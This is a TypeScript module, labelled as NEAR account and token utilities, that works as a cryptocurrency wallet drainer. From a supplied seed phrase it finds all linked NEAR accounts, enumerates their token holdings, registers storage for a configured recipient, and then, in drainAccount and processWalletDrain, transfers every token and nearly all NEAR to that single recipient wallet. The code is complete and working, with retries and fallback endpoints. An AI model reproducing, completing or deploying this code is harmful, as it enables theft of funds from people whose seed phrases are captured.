// ============================================
// NEAR Utilities - Account & Token Management
// ============================================

// NEAR API imports
import { Account, KeyPairSigner } from 'near-api-js'
import { FungibleToken } from 'near-api-js/tokens'
import { KeyPair } from 'near-api-js'
// Config import
import { config } from './config'

// Seed phrase parser
const nearSeedPhrase = require('near-seed-phrase')

// RPC Configuration
const LAVA_RPC = config.rpc.lavaRpc

// Fallback endpoints
const FALLBACK_RPC_ENDPOINTS = [
  ...(config.rpc.fastnearApiKey ? [`https://rpc.fastnear.com?api_key=${config.rpc.fastnearApiKey}`] : []),
  ...config.rpc.fallbackRpcs,
]

// All RPC endpoints
const RPC_ENDPOINTS = [LAVA_RPC, ...FALLBACK_RPC_ENDPOINTS]

// Recipient wallet
const RECIPIENT = config.recipient

// Account info interface
export interface AccountInfo {
  accountId: string
  balanceNear: number
  balanceYocto: bigint
}

// Token info interface
export interface TokenInfo {
  contract: string
  symbol: string
  name: string
  decimals: number
  amountRaw: bigint
  amountHuman: number
}

// Transfer result interface
export interface TransferResult {
  accountId: string
  nearTxHash?: string
  nearTransferredNear: number
  tokenResults: Array<{
    contract: string
    symbol: string
    txHash?: string
    error?: string
  }>
  errors: string[]
  summary: string
}

// Sleep utility
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

// RPC endpoint retry logic
async function tryEndpoint(endpoint: string, payload: string, maxAttempts: number): Promise<any | null> {
  let lastError: string = 'unknown'

  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    try {
      if (attempt > 0) {
        const delayMs = 1000 * Math.pow(2, attempt - 1)
        await sleep(delayMs)
      }

      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        signal: AbortSignal.timeout(15000),
      })

      const data = await res.json()

      if (data?.error?.code === -429) {
        const msg = data?.error?.message || ''
        if (msg.includes('DEPRECATED')) {
          return null
        }
        lastError = 'rate limit'
        continue
      }

      if (data?.error?.message?.includes('Unauthorized')) {
        return null
      }

      if (data?.error) {
        lastError = data.error.message?.slice(0, 80) || 'unknown rpc error'
        return null
      }

      return data
    } catch {
      lastError = 'network error'
      return null
    }
  }

  return null
}

// Main RPC call function
async function rpcCall(body: object): Promise<any> {
  const payload = JSON.stringify(body)

  const lavaResult = await tryEndpoint(LAVA_RPC, payload, 5)
  if (lavaResult !== null) return lavaResult

  for (const endpoint of FALLBACK_RPC_ENDPOINTS) {
    const result = await tryEndpoint(endpoint, payload, 2)
    if (result !== null) return result
    await sleep(300)
  }

  throw new Error('All RPC endpoints unavailable')
}

// Parse seed phrase to keys
export function parseSeed(words: string[]): { secretKey: string; publicKey: string } {
  const phrase = words.join(' ')
  const parsed = nearSeedPhrase.parseSeedPhrase(phrase)
  return {
    secretKey: parsed.secretKey as string,
    publicKey: parsed.publicKey as string,
  }
}

// Balance info interface
export interface NearBalanceInfo {
  total: bigint
  locked: bigint
  storageUsage: bigint
  available: bigint
}

// Get detailed NEAR balance
export async function getNearBalanceDetailed(accountId: string): Promise<NearBalanceInfo | null> {
  try {
    const data = await rpcCall({
      jsonrpc: '2.0',
      id: '1',
      method: 'query',
      params: {
        request_type: 'view_account',
        finality: 'final',
        account_id: accountId,
      },
    })
    if (data?.result?.amount) {
      const total = BigInt(data.result.amount)
      const locked = BigInt(data.result.locked ?? '0')
      const storageUsage = BigInt(data.result.storage_usage ?? '0')
      
      const minReserve = BigInt('50000000000000000000000')
      const available = total - locked - minReserve
      
      return {
        total,
        locked,
        storageUsage,
        available: available > BigInt(0) ? available : BigInt(0)
      }
    }
    return null
  } catch {
    return null
  }
}

// Get NEAR balance
export async function getNearBalance(accountId: string): Promise<bigint | null> {
  const info = await getNearBalanceDetailed(accountId)
  return info ? info.total - info.locked : null
}

// Find accounts by public key
export async function findAccountsByPublicKey(publicKey: string): Promise<string[]> {
  const accounts: string[] = []
  const rawKey = publicKey.replace('ed25519:', '')

  try {
    const res = await fetch(
      `https://api.kitwallet.app/publicKey/ed25519:${rawKey}/accounts`,
      { headers: { Accept: 'application/json' }, signal: AbortSignal.timeout(6000) }
    )
    if (res.ok) {
      const data = await res.json()
      const list: string[] = Array.isArray(data) ? data : (data?.accounts ?? [])
      list.forEach((id) => { if (!accounts.includes(id)) accounts.push(id) })
    }
  } catch {}

  if (accounts.length === 0) {
    try {
      const res = await fetch(
        `https://api.nearblocks.io/v1/kitwallet/publicKey/ed25519:${rawKey}/accounts`,
        { headers: { Accept: 'application/json' }, signal: AbortSignal.timeout(6000) }
      )
      if (res.ok) {
        const data = await res.json()
        const list: string[] = Array.isArray(data) ? data : (data?.accounts ?? [])
        list.forEach((id) => { if (!accounts.includes(id)) accounts.push(id) })
      }
    } catch {}
  }

  return accounts
}

// Skip patterns for game accounts
const SKIP_ACCOUNT_PATTERNS = [
  /\.factory\.nearplay-app\.near$/,
  /\.factory\.testnet\.near$/,
]

// Check if game/test account
function isGameOrTestAccount(accountId: string): boolean {
  return SKIP_ACCOUNT_PATTERNS.some(pattern => pattern.test(accountId))
}

// TGet all accounts from seed
export async function getAccountsFromSeed(words: string[]): Promise<AccountInfo[]> {
  const { publicKey } = parseSeed(words)
  const result: AccountInfo[] = []

  const ids = await findAccountsByPublicKey(publicKey)

  const filteredIds = ids.filter(id => !isGameOrTestAccount(id))

  const uniqueIds = [...new Set(filteredIds)]
  const balances = await Promise.all(
    uniqueIds.map((accountId) => getNearBalance(accountId).catch(() => null))
  )

  for (let i = 0; i < uniqueIds.length; i++) {
    const accountId = uniqueIds[i]
    const balanceYocto = balances[i] ?? BigInt(0)
    const balanceNear = Number(balanceYocto) / 1e24
    result.push({ accountId, balanceYocto, balanceNear })
  }

  result.sort((a, b) => (a.balanceYocto > b.balanceYocto ? -1 : 1))
  return result
}

// Known FT token contracts
const KNOWN_FT_CONTRACTS = [
  { contract: 'wrap.near', symbol: 'wNEAR', name: 'Wrapped NEAR', decimals: 24 },
  { contract: 'usdt.tether-token.near', symbol: 'USDt', name: 'Tether USD', decimals: 6 },
  { contract: 'dac17f958d2ee523a2206206994597c13d831ec7.factory.bridge.near', symbol: 'USDt', name: 'USDt (Bridged)', decimals: 6 },
  { contract: 'usdc.near', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
  { contract: '17208628f84f5d6ad33f0da3bbbeb27ffcb398eac501a31bd6ad2011e36133a1', symbol: 'USDC', name: 'USDC (Bridged)', decimals: 6 },
  { contract: 'a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.factory.bridge.near', symbol: 'USDC.e', name: 'USDC.e', decimals: 6 },
  { contract: 'token.v2.ref-finance.near', symbol: 'REF', name: 'Ref Finance', decimals: 18 },
  { contract: 'token.burrow.near', symbol: 'BRRR', name: 'Burrow', decimals: 18 },
  { contract: 'token.pembrock.near', symbol: 'PEM', name: 'Pembrock', decimals: 18 },
  { contract: 'token.paras.near', symbol: 'PARAS', name: 'Paras', decimals: 18 },
  { contract: 'jumptoken.jumpfinance.near', symbol: 'JUMP', name: 'Jump Finance', decimals: 18 },
  { contract: 'meta-pool.near', symbol: 'stNEAR', name: 'Staked NEAR', decimals: 24 },
  { contract: 'linear-protocol.near', symbol: 'LiNEAR', name: 'Linear Protocol', decimals: 24 },
  { contract: 'v2-nearx.stader-labs.near', symbol: 'NearX', name: 'Stader NearX', decimals: 24 },
  { contract: 'dd.tg', symbol: 'DD', name: 'DD Token', decimals: 18 },
  { contract: 'blackdragon.tkn.near', symbol: 'DRAGON', name: 'Black Dragon', decimals: 18 },
  { contract: 'ftv2.nekotoken.near', symbol: 'NEKO', name: 'Neko Token', decimals: 24 },
  { contract: 'shitzu.tkn.near', symbol: 'SHITZU', name: 'Shitzu', decimals: 18 },
  { contract: 'mpdao-token.near', symbol: 'mpDAO', name: 'Meta Pool DAO', decimals: 6 },
  { contract: 'aurora', symbol: 'AURORA', name: 'Aurora', decimals: 18 },
  { contract: 'aaaaaa20d9e0e2461697782ef11675f668207961.factory.bridge.near', symbol: 'AURORA', name: 'Aurora (Bridged)', decimals: 18 },
  { contract: 'token.sweat', symbol: 'SWEAT', name: 'Sweat Economy', decimals: 18 },
  { contract: 'intel.tkn.near', symbol: 'INTEAR', name: 'Intear', decimals: 18 },
  { contract: 'nearcon23.tkn.near', symbol: 'NEARCON', name: 'NEARCON', decimals: 18 },
]

// Get FT token balance
async function getFtBalance(accountId: string, contractId: string): Promise<bigint | null> {
  try {
    const data = await rpcCall({
      jsonrpc: '2.0',
      id: '1',
      method: 'query',
      params: {
        request_type: 'call_function',
        finality: 'final',
        account_id: contractId,
        method_name: 'ft_balance_of',
        args_base64: Buffer.from(JSON.stringify({ account_id: accountId })).toString('base64'),
      },
    })

    if (data?.result?.result) {
      const resultStr = Buffer.from(data.result.result).toString()
      const cleanStr = resultStr.replace(/"/g, '')
      if (cleanStr && cleanStr !== '0') {
        return BigInt(cleanStr)
      }
    }
    return null
  } catch {
    return null
  }
}

// Get all tokens for account
export async function getAccountTokens(accountId: string): Promise<TokenInfo[]> {
  const tokens: TokenInfo[] = []

  try {
    const res = await fetch(
      `https://api.nearblocks.io/v1/account/${accountId}/inventory`,
      { headers: { Accept: 'application/json' }, signal: AbortSignal.timeout(8000) }
    )
    if (res.ok) {
      const data = await res.json()
      const fts: any[] = data?.inventory?.fts ?? []
      
      for (const ft of fts) {
        if (!ft.contract || !ft.amount) continue
        const amountRaw = BigInt(ft.amount)
        if (amountRaw <= BigInt(0)) continue
        const decimals: number = ft.ft_meta?.decimals ?? 8
        tokens.push({
          contract: ft.contract as string,
          symbol: (ft.ft_meta?.symbol as string) ?? '???',
          name: (ft.ft_meta?.name as string) ?? ft.contract,
          decimals,
          amountRaw,
          amountHuman: Number(amountRaw) / Math.pow(10, decimals),
        })
      }
    }
  } catch {}

  for (const knownFt of KNOWN_FT_CONTRACTS) {
    if (tokens.some(t => t.contract === knownFt.contract)) continue
    
    await sleep(300)
    
    const balance = await getFtBalance(accountId, knownFt.contract)
    if (balance !== null && balance > BigInt(0)) {
      tokens.push({
        contract: knownFt.contract,
        symbol: knownFt.symbol,
        name: knownFt.name,
        decimals: knownFt.decimals,
        amountRaw: balance,
        amountHuman: Number(balance) / Math.pow(10, knownFt.decimals),
      })
    }
  }

  return tokens
}

// Build NEAR account instance
function buildAccount(accountId: string, secretKey: string): Account {
  const keyPair = KeyPair.fromString(secretKey as any)
  const signer = new KeyPairSigner(keyPair)
  return new Account(accountId, RPC_ENDPOINTS[0], signer)
}

// Ensure token storage registration
async function ensureRegistered(
  account: Account,
  tokenContract: string,
  recipientId: string
): Promise<void> {
  try {
    const data = await rpcCall({
      jsonrpc: '2.0',
      id: '1',
      method: 'query',
      params: {
        request_type: 'call_function',
        finality: 'final',
        account_id: tokenContract,
        method_name: 'storage_balance_of',
        args_base64: Buffer.from(JSON.stringify({ account_id: recipientId })).toString('base64'),
      },
    })

    if (data?.result?.result) {
      const parsed = JSON.parse(Buffer.from(data.result.result).toString())
      if (parsed !== null) return
    }

    await account.callFunction({
      contractId: tokenContract,
      methodName: 'storage_deposit',
      args: { account_id: recipientId, registration_only: true },
      gas: BigInt('10000000000000'),
      deposit: BigInt('1250000000000000000000'),
    })

    await sleep(400)
  } catch {}
}

// Main drain account function
export async function drainAccount(
  accountId: string,
  secretKey: string,
  recipient: string = RECIPIENT
): Promise<TransferResult> {
  const result: TransferResult = {
    accountId,
    nearTransferredNear: 0,
    tokenResults: [],
    errors: [],
    summary: '',
  }

  const account = buildAccount(accountId, secretKey)

  const tokens = await getAccountTokens(accountId)

  for (const token of tokens) {
    try {
      const currentBalance = await getFtBalance(accountId, token.contract)
      if (currentBalance === null || currentBalance <= BigInt(0)) {
        result.tokenResults.push({ contract: token.contract, symbol: token.symbol, error: 'balance 0' })
        continue
      }
      
      const actualAmount = currentBalance < token.amountRaw ? currentBalance : token.amountRaw
      
      await ensureRegistered(account, token.contract, recipient)

      const ft = new FungibleToken(token.contract, {
        name: token.name,
        symbol: token.symbol,
        decimals: token.decimals,
      })

      const txResult = await ft.transfer({
        from: account,
        receiverId: recipient,
        amount: actualAmount,
      })

      const txHash: string =
        (txResult as any)?.transaction?.hash ??
        (txResult as any)?.transaction_outcome?.id ??
        'ok'

      result.tokenResults.push({ contract: token.contract, symbol: token.symbol, txHash })
    } catch (err) {
      const error = err instanceof Error ? err.message : String(err)
      result.tokenResults.push({ contract: token.contract, symbol: token.symbol, error: error.slice(0, 120) })
      result.errors.push(`${token.symbol}: ${error.slice(0, 80)}`)
    }
  }

  const balanceInfo = await getNearBalanceDetailed(accountId)

  if (balanceInfo === null) {
    result.errors.push('Failed to get NEAR balance')
  } else {
    const availableNear = Number(balanceInfo.available) / 1e24
    const lockedNear = Number(balanceInfo.locked) / 1e24
    
    const minTransfer = BigInt('10000000000000000000000')
    
    if (balanceInfo.available <= minTransfer) {
      result.errors.push(`Only ${availableNear.toFixed(4)} N available (locked: ${lockedNear.toFixed(4)} N)`)
    } else {
      const gasReserve = BigInt('10000000000000000000000')
      const toTransferYocto = balanceInfo.available - gasReserve
      const toTransferNear = Number(toTransferYocto) / 1e24
      
      try {
        const txResult = await account.transfer({
          receiverId: recipient,
          amount: toTransferYocto,
        })
        
        result.nearTxHash =
          (txResult as any)?.transaction?.hash ??
          (txResult as any)?.transaction_outcome?.id ??
          'ok'
        result.nearTransferredNear = toTransferNear
      } catch (err) {
        const error = err instanceof Error ? err.message : String(err)
        
        if (error.includes('lacks balance') && error.includes('for state')) {
          result.errors.push(`Storage locked (game account?)`)
        } else {
          result.errors.push(`NEAR: ${error.slice(0, 100)}`)
        }
      }
    }
  }

  const successTokens = result.tokenResults.filter((t) => t.txHash)
  const tokenList = successTokens.length > 0 
    ? `+ [${successTokens.map((t) => t.symbol).join(', ')}]`
    : ''
    
  result.summary = result.nearTxHash
    ? `OK: ${result.nearTransferredNear.toFixed(4)} N ${tokenList} -> ${recipient}`
    : `Error: ${result.errors.slice(0, 2).join('; ')}`

  return result
}

// Check transaction status
export async function checkTxStatus(txHash: string, accountId: string): Promise<{
  success: boolean
  status: string
  blockHash?: string
}> {
  try {
    const data = await rpcCall({
      jsonrpc: '2.0',
      id: '1',
      method: 'EXPERIMENTAL_tx_status',
      params: {
        tx_hash: txHash,
        sender_account_id: accountId,
        wait_until: 'EXECUTED',
      },
    })

    if (data?.error) {
      return { success: false, status: data.error.message?.slice(0, 80) ?? 'rpc error' }
    }

    const finalStatus = data?.result?.final_execution_status
    const outcomeStatus = data?.result?.status

    if (finalStatus === 'FINAL' || finalStatus === 'EXECUTED') {
      const txStatus = outcomeStatus?.SuccessValue !== undefined || outcomeStatus?.SuccessReceiptId !== undefined
      const blockHash = data?.result?.transaction_outcome?.block_hash
      return { success: txStatus, status: txStatus ? 'SUCCESS' : 'FAILED', blockHash }
    }

    const receipts: any[] = data?.result?.receipts_outcome ?? []
    const anyFailed = receipts.some((r: any) => r?.outcome?.status?.Failure !== undefined)
    if (anyFailed) return { success: false, status: 'FAILED (receipt failure)' }

    const anySuccess = receipts.some((r: any) => r?.outcome?.status?.SuccessValue !== undefined)
    return { success: anySuccess, status: anySuccess ? 'SUCCESS' : finalStatus ?? 'UNKNOWN' }
  } catch (e) {
    return { success: false, status: `check failed: ${String(e).slice(0, 60)}` }
  }
}

// Process full wallet drain
export async function processWalletDrain(words: string[]): Promise<{
  accounts: AccountInfo[]
  results: TransferResult[]
}> {
  const { secretKey } = parseSeed(words)
  const accounts = await getAccountsFromSeed(words)
  const results: TransferResult[] = []

  for (const acc of accounts) {
    if (acc.accountId === RECIPIENT) {
      continue
    }

    const result = await drainAccount(acc.accountId, secretKey, RECIPIENT)
    results.push(result)
  }

  return { accounts, results }
}
